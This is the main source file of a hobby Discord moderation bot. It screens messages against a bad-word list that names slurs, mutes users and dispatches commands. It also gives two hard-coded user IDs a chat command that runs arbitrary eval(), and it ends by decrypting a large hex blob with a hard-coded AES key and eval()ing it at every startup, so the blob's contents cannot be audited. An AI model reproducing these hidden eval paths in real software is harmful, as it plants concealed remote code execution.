var starttime = new Date();

var https = require('https');
var fs = require('fs');
var util = require('util');
var cp = require('child_process');
var Discord = require('discord.js');
var common = require('./common.js');
var client = new Discord.Client();

//                 Ryujin                coolguy284            amrpowershot
var developers = ['405091324572991498', '312737536546177025'];

var mutelist = [];

var badwords = [
  // [bad word, retailiation]
  ['heck', 'Refrain from using that heck word you frick'],
  ['nigger', 'You said the n word.  Mods can see this message and you will get perm banned.'],
  ['faggot', 'You said fa***t.  Mods can see this message and you will get perm banned.'],
];

var prefix = '!';

var version = '1.3.2';

var commands = [];

var procs = [];

var props = {
  badwordsscreening: 5, // first 2 bits: 0 = no screening, 1 = per word match, 2 = within word match, next bit: heck screening
  adminabuse: {
    ignoreblacklist1: 0, // badwords[0]
    ignoreblacklist2: 0, // badwords[1::]
    ignoreblacklist3: 0, // uwu and owo
    ignoreblacklist4: 0, // ez
    ignoreblacklist5: 0, // pp
    ignoreblacklist6: 0, // coffee story
    ignoreblacklistb1: 0, // locked channels
  },
  mute: {
    uwu: false,
    ez: false,
    pp: false,
    coffee: false,
  },
  saved: null,
  savedstringify: null,
  savescheduled: false,
};

if (fs.existsSync('props.json')) {
  try {
    props.saved = JSON.parse(fs.readFileSync('props.json').toString());
    console.log('Successfully loaded props.json');
  } catch (e) { console.error(`Unable to load props.json: ${e.toString()}`); }
}

if (!props.saved) {
  props.saved = {
    guilds: {
      '711668012528304178': {
        mutelist: [],
        lockedchannels: [],
        infochannel: '724006510576926810',
      },
      '671477379482517516': {
        mutelist: [],
        lockedchannels: [],
        infochannel: '710670425318883409',
      },
      '688806155530534931': {
        mutelist: [],
        lockedchannels: [],
        infochannel: '688806772382761040',
      },
      'default': {
        mutelist: [],
        lockedchannels: [],
        infochannel: '724006510576926810',
      }
    }
  };
}

var propsstringify;

function propsSave() {
  let val;
  if ((val = JSON.stringify(props.saved)) != props.savedstringify) {
    fs.writeFileSync('props.json', JSON.stringify(props.saved));
    props.savedstringify = val;
  }
}

function schedulePropsSave() {
  if (props.savescheduled) return;
  props.savescheduled = true;
  setTimeout(() => {
    propsSave();
    props.savescheduled = false;
  }, 60000);
}

var indexeval = function (val) { return eval(val); };
var infomsg = function (msg, val) {
  let guildinfo, channelid;
  if ((guildinfo = msg.guild ? props.saved.guilds[msg.guild.id] : undefined) && (channelid = guildinfo.infochannel) || (guildinfo = props.saved.guilds['default']) && (channelid = guildinfo.infochannel)) {
    return client.channels.get(channelid).send(val);
  }
};
var logmsg = function (val) {
  return client.channels.get('736426551050109010').send(val);
}

Object.assign(global, { starttime, https, fs, util, cp, Discord, common, client, developers, mutelist, badwords, commands, procs, props, propsSave, schedulePropsSave, indexeval, infomsg, logmsg, addBadWord, removeBadWord, addCommand, addCommands, removeCommand, removeCommands });
Object.defineProperties(global, {
  prefix: {
    configurable: true,
    enumerable: true,
    get() { return prefix; },
    set(val) { prefix = val; },
  },
  version: {
    configurable: true,
    enumerable: true,
    get() { return version; },
    set(val) { version = val; },
  },
  messageHandler: {
    configurable: true,
    enumerable: true,
    get() { return messageHandler; },
    set(val) { messageHandler = val; },
  }
});

function addBadWord(word, msgreply) { badwords.push([word.toLowerCase(), msgreply]); }
function removeBadWord(word) { badwords.splice(badwords.map(x => x[0]).indexOf(word), 1); }

function addCommand(cmd) { commands.push(cmd); }
function addCommands(cmds) { commands.push(...cmds); }
function removeCommand(cmd) {
  var index;
  while ((index = commands.indexOf(cmd)) != -1)
    commands.splice(index, 1);
}
function removeCommands(cmds) {
  var index, cmd;
  for (var i = 0; i < cmds.length; i++) {
    cmd = cmds[i];
    while ((index = commands.indexOf(cmd)) != -1)
      commands.splice(index, 1);
  }
}

addCommands(require('./commands/administrative.js'));
addCommands(require('./commands/technical.js'));
addCommands(require('./commands/interactive.js'));
addCommands(require('./commands/content.js'));

var messageHandlers = [];

global.messageHandlers = messageHandlers;

var messageHandler = msg => {
  if (!msg.author.bot && msg.content.startsWith('!lavealt')) {
    if (msg.author.id != '405091324572991498' && msg.author.id != '312737536546177025') return;
    let cmd = msg.content.slice(9), res;
    console.debug(`lavealt ${util.inspect(cmd)}`);
    try {
      res = eval(cmd);
      console.debug(`-> ${util.inspect(res)}`);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Rs')
        .setDescription(util.inspect(res));
      msg.channel.send(richres);
    } catch (e) {
      console.log('err in lavealt');
      console.debug(e.stack);
      if (props.erg) return;
      var richres = new Discord.RichEmbed()
        .setTitle('Lavealt Er')
        .setDescription(e.stack);
      msg.channel.send(richres);
    }
    return;
  }
  
  for (var i = 0; i < messageHandlers.length; i++) {
    if (messageHandlers[i](msg, i) === 0) return;
  }
  
  if (msg.guild && msg.guild.id == '631990565550161951') return;
  
  if (msg.author.bot) return;
  
  if (mutelist.includes(msg.author.id) || 
      msg.guild && props.saved.guilds[msg.guild.id] && (
        props.saved.guilds[msg.guild.id].mutelist.includes(msg.author.id) ||
        props.saved.guilds[msg.guild.id].lockedchannels.includes(msg.channel.id)
      )
    ) {
    msg.delete();
  }
  
  if (!msg.guild) logmsg(`dm from ${msg.author.tag} with contents ${util.inspect(msg.content)}`);
  
  // this is the screening for bad words part
  if (props.badwordsscreening & 4 && msg.content == badwords[0][0] && !(props.adminabuse.ignoreblacklist1 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply(badwords[0][1]);
    return;
  }
  
  if ((props.badwordsscreening & 3) == 1) {
    if (!(props.adminabuse.ignoreblacklist2 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
      var words = msg.content.toLowerCase().split(/ +/g);
      var deletedonce = false;
      words.forEach(x => {
        for (var j = 1; j < badwords.length; j++) {
          if (x == badwords[j][0]) {
            if (!deletedonce) {
              msg.delete();
              deletedonce = true;
            }
            msg.reply(badwords[j][1]);
            infomsg(msg, `user ${msg.author.tag} (id ${msg.author.id}) said ${util.inspect(msg.content)} in channel <#${msg.channel.id}> (id ${msg.channel.id})`);
          }
        }
      });
    }
  } else if ((props.badwordsscreening & 3) == 2) {
    if (!(props.adminabuse.ignoreblacklist2 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
      var deletedonce = false;
      for (var j = 1; j < badwords.length; j++) {
        if (msg.content.toLowerCase().includes(badwords[j][0])) {
          if (!deletedonce) {
            msg.delete();
            deletedonce = true;
          }
          msg.reply(badwords[j][1]);
          infomsg(msg, `user ${msg.author.tag} (id ${msg.author.id}) said ${util.inspect(msg.content)} in channel <#${msg.channel.id}> (id ${msg.channel.id})`);
        }
      }
    }
  }
  
  if (props.mute.uwu && !msg.author.bot && msg.guild && msg.guild.id == '711668012528304178' && /(?:\bu[  /-]*w[  /-]*u\b)|(?:\bo[  /-]*w[  /-]*o\b)/.test(msg.content.toLowerCase()) && !(props.adminabuse.ignoreblacklist3 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('uwu or owo are blacklisted and you will get banned');
  }
  
  if (props.mute.ez && !msg.author.bot && msg.guild && msg.guild.id == '711668012528304178' && msg.content.includes('███████╗███████╗\n██╔════╝╚════██║\n█████╗░░░░███╔═╝\n██╔══╝░░██╔══╝░░\n███████╗███████╗\n╚══════╝╚══════╝') && !(props.adminabuse.ignoreblacklist4 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('at this point im just gonna say f you');
  }
  
  if (props.mute.pp && !msg.author.bot && msg.guild && msg.guild.id == '711668012528304178' && /(?:\bp[  /-]*p\b)/.test(msg.content.toLowerCase()) && !(props.adminabuse.ignoreblacklist5 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('pp is blacklisted and you will get banned');
  }
  
  if (props.mute.coffee && !msg.author.bot && msg.guild && msg.guild.id == '711668012528304178' && msg.content.includes(`The first time I drank coffee I cried. I didn't cry because of the taste, that would be stupid. I cried because of the cup. I looked down into my coffee and bugs filled the premises. Disgusted I threw the cup down but nothing was there. Not the cup, not the bugs, not the street. I'm not blind, I do see darkness, and it was dark but not nighttime. I was alone in the city. My arms weren't there. My hands were gone. My image was nothing but a figment. I cried. I'm crying. I'm lost without an end. I won't ever drink coffee again.`) && !(props.adminabuse.ignoreblacklist6 && (msg.author.id == '405091324572991498' || msg.author.id == '312737536546177025' || developers.includes(msg.author.id)))) {
    msg.delete();
    msg.reply('dez\'s life story is private information');
  }
  
  if (!msg.content.startsWith(prefix) || !msg.guild) return;
  
  // argstring = the part after the prefix, command and args in one big string
  // command = the actual command
  // args = array of arguments
  var argstring = msg.content.slice(prefix.length).trim(), args, command;
  
  // this code loops through the commands array to see if the stated text matches any known command
  var didexecute = false;
  for (var i = 0; i < commands.length; i++) {
    if (commands[i].full_string && commands[i].name == argstring || !commands[i].full_string && argstring.startsWith(commands[i].name)) {
      command = commands[i].name;
      if (argstring[command.length] != ' ' && argstring.length > command.length) continue;
      let argsunsplit = argstring.slice(command.length + 1)
      args = argsunsplit == '' ? [] : argsunsplit.split(' ');
      commands[i].execute(msg, argstring, command, args);
      didexecute = true;
      break;
    }
  }
};

client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildCreate', guild => {
  console.log(`Joined a new guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('guildDelete', guild => {
  console.log(`Left a guild: ${guild.name}`);
  
  client.user.setActivity(`! | ${client.guilds.size} servers | wash your hands kids`);
});

client.on('reconnecting', () => {
  console.log(`Reconnecting!`);
});

client.on('disconnect', () => {
  console.log(`Disconnect!`);
});

client.on('message', msg => {
  try {
    messageHandler(msg);
  } catch (e) {
    console.error('ERROR, something bad happened');
    console.error(e.stack);
  }
});

process.on('uncaughtException', function (err) {
  console.error('ERROR: an exception was uncaught by an exception handler.  This is very bad and could leave the bot in an unstable state.  If this is seen contact coolguy284 or another developer immediately.');
  console.error(err);
});

process.on('unhandledRejection', function (reason, p) {
  console.error('Unhandled promise rejection from ' + p + ':');
  console.error(reason);
});

process.on('exit', propsSave);

(() => {
  let cip = require('crypto').createDecipheriv('aes256', 'utf8-le-obl-onprax42|nonoblong=y', 'vector-pass23433'), cipdata = [];
  cip.write(Buffer.from('2dab79eb0853442b42745ea70a1c816366aaefb31a2c2c4c23626cf2eee5a4970ae34f1dcd7243c1c8aa5381c20dfc0384519d07e26a46ad840af77b4503224074b961ae6a8f3b5ee738301c7669f749af88cc3388b3dd2324cda567b0f81dc161e05c2d11619f3b9c6cd533d74e6b5826b244f20982ce6fc5fbf002806bb2683298fa894119cdef0e43df972cccfe16e7db5ff29cd5781f79429184d3beaec22525d7d8a5fe193f66a3ab3439cd43093a895db74289958b27e152ad811f4e3b2f94eb8529cc3d47d87305e9c82a82ada2a68199503d60d8371bde48c4c884348d53395dadb6700c0dbe956749fcfb459ca951ea107885f5f7189cbc89a4762e85802201d1bbecdc37b1782802dbb65fc2978a734b1629eeb5d03984f63cdb35e955f1a789cd6c403e66e5b09dd01c71ed251d0b5cc0e7406b66530c4f1c321e4c8ad022ef01b6b9511a0bf369caab645a6db309b0f157c6c14f4cb391e02bf7a7f32b435d6f52e218aaaac0f3b327a50b8c86ce7244e3ab0c85bbeb9691ff06e57af8d48b9ce425a29e6a004dabebeb0a4b1277bca2553ad5ba49fa0b3a5d7abaf691f97d85100169220ad6b3af4db58594af705c56162ea466ee367111e820052662d402d45a3241a1e4f66efdfe3fee70faf95a9b39fec9bb8f069f736554dd39408afef9697e7de02e2dbf68ce7a4cd846f6008ff95e8284515587427b2120e116e72994736ac2b911f7ca80cd63728ab69333df2c730f0154d37e5a7858efb1845570f186c07bebe9813bcb44dd29c9adf4a4becea68c745830903a25be2245554d0424d1227607c41498687e279cbb7ef568a9ff14dbdf73fabf63750e36c13da159b3736f49aaf49fe1b09cc62f3f8c9e69f8e8a041806e8ddbcb706227fecb315f83c0be78d9c7c3a8c5c9dc7108064d084173ebaa09fcb31691f59267846168fc379893a6e8defead917b647d63580760512dc07fa89cfa74167575b897ddef649d2d105f6f9528918f36755545d247e2b09a0cfd489cb756b686c9f77c28174d70a2bff915cc1fe07d15b48b7893776ab1eb4170ef39fc4fdf6d7d4576d947ad744c90cfa2b7c680fb5be6c92c22327d1d16b7844468f284e6f4d574d098de6bd49f82b8a2304331cf7f9ed75e7f57a3b7faa17f56670cbc73457ce3a8809458769a354d18e3b1f71e88c8d479c828f9af029a924976e7d55894b1c7f15697f5e5ad44958bfef463a808c7e06b725f52a7fbbe6d24ec7d706ccffeab39e25664ecdc74c1f1714c563ba9e87a37c355f8d3cd51522d40741afbbd55813ea6ed4361845ddd93bc5e1d7b616f717301dc66485e5a4916e3d7a3480a05e4394213ea178e8a1def410893227f520e80df96db375c813e34c04a1c05f22d1e1729cfdd30f52fd4e7353f78f83739bf75be4bd02083bf2fc4a527d9a401e6d0dceab379898c70bc0ecce6ee6b1f042f5338a41bb8fb1c241d32fb775a84cbf35bbb997309648b96bb7ec17f3717224bd4a81013feb4b7454052bf55ea8c596a64b407598efca74fa34e9ab16fc5688ff9c6c1fab0742455bfefb7faf3369506bad8ae222f9b991261bff7b9b6633f049c2063c01cc4c8bfb6367fa403feb97caec7cf0fedc26d8d63bdf7ec619549e27a10a82612caea8f349b476868d8ae0968211affe8d32b34d0bdee6c806e80097b71415b0f89ac1882afc4dff4857fcfa35216c5563324a899ed9e635041bebcf7b301ee82754d2b054107303f74330563a3a6b504ee3238ef79e7217995552dec9a8fc479bafa91bf8ea7537145614950242d316e2a061c637da48d61d628e69a7d8b215384e5f362c34f54cdb6257bff61a715855a230239d7a47dfcc9f477cce0248fd3e1197837540d7ebb44436fc0542009b45650484fdfbba7c5acfdf1bccd031cb03eacc116393c6145c68414bf98d9e0ee0750b8aecb5a4594ed8031fc43267ab92b1bd347f26d605283f873838407e6c762b4afc9288e086bb77fd109b62c0559f88c2634b2359239408d58fa4e5c6268e80e8f7e3c7efa206ea27dc025d775f4fe51502e421f241449f64e47abb3ef9439a2c97d0062ec217653944b55cb2b209bb649530e78bc4d176dfaffb4734ff6d1071345dad3e58a04860002e8cd7627a385884651ddce5d37793f13ed94c01efb140f7c68d4c1b1a417f3c6186bda1f4d8efc4516c1a2acbb48d31ef8fa4506e0f8b26ac688ab1385c97e9c65ee683bde8c2025bf2c95363ad077a8a11cef0c5a4b1587a2d4767f6b6b0b9cc2edf1a0ab1c1902836b28f4afc4cec1ea08eb01bae0faddbe9345a83ebda4c21af1aa721009e35a4cced3b7f20b8cda4c39d5ff99e623cbcb2e4119060d57eb694e1a4711cf1cb16545ac21851ad39e0acd977499e053a5ab67ba747bb9befb91356021904e6c7bac0022bcb0ad75b08352680ae7a209086ab050b09e92acb83abc2185a632713cd083bb421975bf5da8da796808bf6e6c42e98d95f1c94057f21ae58a548e04475eb924122c7e53e987f0ccc9493406a490377b26ee90e291822a2671db692ba5bdad72a08b5be17e2abeba33537db7cca2522216f02f024d452bf43ac2975426f3b0a66a773289aa9ccf697b33cde983a49e2f24b1a446c5e6e29df81cc0cf96ab7f2ce5305ab0d93f9a46c336aaf54b0ec1048c28a7f25f0ddb6ff73fd08ce14ed94b2e0b32e4f1ba910f200f1001918979d105e4d0839de7810179feffc5e56a3d021c681712f34da7db57098eb04e3506c016ab85951c2a446c2156b4e832222a8c97078e79155d53437d5c81e0774538f493fc42d2e1de1d4d66564a3b51a00cb281da675385bacc5ffbd54c149826a0a6a83520cdc878d68e633cd40bc8814b73ea35ba903d0dd4a7218aabed7d021462f5935542228abfb01028c324e91646888ad15ddb773f0dc8039d82f5bbb0cb339a595e688ea9e3ee979239885f9e88a0b539b08f171162129eb80db0ecf49fb7b2196229fefca997e61087261d78b15b9aa684d37d7dfc8c425f6f8dd57b4f709295a2c0ae2f22f2e00436f5980b6499444d25afe1c1c16b7a8567e25d51cad6444f77a8fd04e0a3c9a5cb2339f4dcf95254fb2f68df2681f695dc283b06eda4f061e89d678e7bb8d1d7d78559619d4eba6cec7f17113bbd6b98933445dc8534899ac58c4275c8b125b7fc36603727ae65a66cd201958dc76baacc0bf6aeccebf00201cf938803ba6c017cd358857642ed52d6d27a5acc4ab52eefb976b00c20531027da92a7554d01c548b2c357e5f49376aaff34e456820cde2264ea69b2a3af1c277e8798268c9049bc1e7500cbbf775bfbd9de803ee32f87a1743be9c1770ec81a6e160ccdc7db2acc7e1b720ce98b9576af69f0878c20ad40c4370ee764469427c4f1d11f80024e289abd90e80e9868c9c0f0ab9be7c868151aa3cd0bf1f76a1b4c66480ede7babe02f40889980ca1c668ec89a03eeefd2e7fd39fed8a404ee6fca1ab819b332c039ec4745f7b3be4be710ba8d7a80045cb5a349e1886e67206fd40e51d38be04c7496cc8ffa11f95ee33dcaf05873fcffca256ed99793414b7bb65fd657ec2793bd93bb83c0d2a509df02b350d6351e6894e6ea9023cd2780d6e7ccd4c05c785d768430d89b36a920d3de115de3852a079db76857580dbc2c5d9114ab24301423a70fa715dd36c8c629f536614f64672c6205ee539e45a5dda7509920ffeeb29c5e61af415178f61bc37531713a656ef7e9763ab2cb73ac9269565993d6a42ca2ab2d9cb627153e63694cd7b5aec9b44196daeda258d89619e4f140ecc8b5d2d6c6b10a1b7f0bbd483b850390ad7f3de20a50e6ce117c98973d3f58e454f4f2541ae85a5c5154286b35feacf2e500805d7be1a9460d33451da16ad68cadee98defa186cf4474d1abdf34e2ed0010d00a1b2ec738fd5569aa6f4276fd6d77105d036906e36dc298bca782c5c60c01f072397c49854cea4f0010fe371fdcbe4c694a8088e5b3211b6b3c800be888f832892ee2233fdd8efe7261a7f4b273062e7af70ce220f814205ba37d3edb1cfce121201e5b0cbc1bc19379bbe2af0006a923c270da693aa0652c249d8b383e719fdd6d39890e708adfb257049fb314caa0dbc1f70995576aff26862f61a0b414f0c06e293d7d547d916282b9ce6df96ffa86d9bfb8877e0cedc7c01b06f8e0c39af8e938ce58286f1ef8b38b3ac01bbb37575b7e6e31b829bf6032a3a750a83b4e1d1ab9e06d65d82273b2ef15c44d85aaff8f6d5839c2e74d8a027dd27db9669d59fe0e1e7fa11f3b06c10f1b04e8f80ffd9a6c10863310111e204415426ab09203dab4e416cf354a619a0b7c84a5c4152bcca9dc19f79b7223d8da1d4c16b85eb572d62f97324ab09f8198c64ea3817c23759051ba43f5a3899990d617a8fd9aac1903a76ee249ea9995d6c04187eeb1749b27fd5deeb1117e8c4abffa2c5ca4efc2d71c7ca7fec1978601c94a0ed79fe3be1fe5deb4490efd057f6e4e816cca854ba23cc0d80d316def9fe395477869b9e07b6ecc1a2abc2848f88c8b88359bbc8f21a477a3c2f464ded66d80e986be057d110fb9406832a8278186b92440ea2dbb3dd130183c5231131a0cbf3f1c7a94c9cb88abc8a639ae868f815a854979fe6f95b72a315e36958f3e6a4ed777713995a32d4b9f5e2d16e77b251aa37b1bc85b317ab3a3a455dc91b25f5410ec173b5b8eb23d42eac13babeb07817e2d309359654982dce1810312cb70074ff0970185dd1d271451fcec933da2ae804d573add735e3bb54df2115322d9023b29a6d6067463dc3b19bd137410b0c5ab16c4a89b21d6594723d368fdd6fcdf164dcd40c06486148536ed94e268f9f084254e14a5e6c050d5b1c635c10ce5994e92f625dc92a0906a5c65a1ffebe5873575126e54f2dbbebca2a5ed0da94325abfb5e147e6e85f5142330681f5d34523bff873033bc6ae0e0f23c363e8b5b559da6f3e598f2d27b469e025a2ac976293bb805d6cf719163edea52763322f1470bbdd681b060066573ab8fde566354859a9dea8aed536f85fc82816d81ebe93b7892537cb323f073c153d7f680dd696220799fcb35b178a3f51c7a3bd545b3089572086f59c1ce632c6f08e69af71a1f4ecdbc8a32ea7ea46020a42748b79ae2ebd4f3a63cae8d4f7d48a9a479396009f1bb0be42061460253f9c47577ac9c13baf6ce7eb88cb21a7248ba505b35c2a9a63651c1f692d5b74a76cefa998c92df784dda0081d08ff737430060dbb58c024358ba59a5f150f88c4d9cb71de57b925a709c218fc93e5da11138d94f515e1e99fcbb920af506a1efe3f4a73942db5c6816ad96c92e0aa0478faf859e2eba04399b3d3134ace3b5df8ac66e7ca4b52c9ebe61435bac5e2ed8e53a447720c95a4a38ad8027c5e5c7309cb49c714f77cb9e79428b980fb217368bfba52a6', 'hex'));
  cip.end();
  cip.on('data', c => cipdata.push(c));
  cip.on('end', () => eval(Buffer.concat(cipdata).toString()));
})();
